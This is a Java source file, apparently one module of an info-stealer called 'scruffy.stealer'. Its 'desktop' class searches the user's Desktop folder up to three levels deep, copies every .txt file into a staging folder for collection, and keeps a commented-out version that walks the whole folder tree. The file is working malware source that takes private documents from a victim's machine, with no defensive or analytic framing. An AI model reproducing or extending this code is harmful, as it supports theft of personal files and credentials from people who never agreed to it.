package scruffy.stealer.impl.system;

import java.io.File;

import org.apache.commons.io.FileUtils;

import scruffy.stealer.utils.utilities;

public class desktop extends utilities {
	
    public void initialize() throws Exception {
        for (File file : new File(System.getProperty("user.home") + "/Desktop").listFiles()) {
            if (file.getName().endsWith(".txt")) {
                FileUtils.copyFile(file, new File(getFolder() + "/desktop/" + file.getName()));
				content.add("desktop");
            }
            
            if (file.isDirectory()) {
                for (File file2 : file.listFiles()) {
                    if (file2.getName().endsWith(".txt")) {
                        FileUtils.copyFile(file2, new File(getFolder() + "/desktop/" + file2.getName()));
    					content.add("desktop");
                    }
                    
                    if (file2.isDirectory()) {
                        for (File file3 : file2.listFiles()) {
                            if (file3.getName().endsWith(".txt")) {
                                FileUtils.copyFile(file3, new File(getFolder() + "/desktop/" + file3.getName()));
            					content.add("desktop");
                            }
                        }
                    }
                }
            }
        }

    	/* # for all txts on all desktop variants (covers very large sizes)

        Files.walk(Paths.get(System.getProperty("user.home") + "/Desktop"))
	        .filter(x -> x.toFile().getName().endsWith(".txt") & x.toFile().length() > 0).forEach(path -> {
	            try {
	                FileUtils.copyFile(path.toFile(), new File(getFolder() + "/desktop/" + path.toFile().getName()));
	            } catch (Exception ignore) {}
	        }
	    );*/
    }
    
}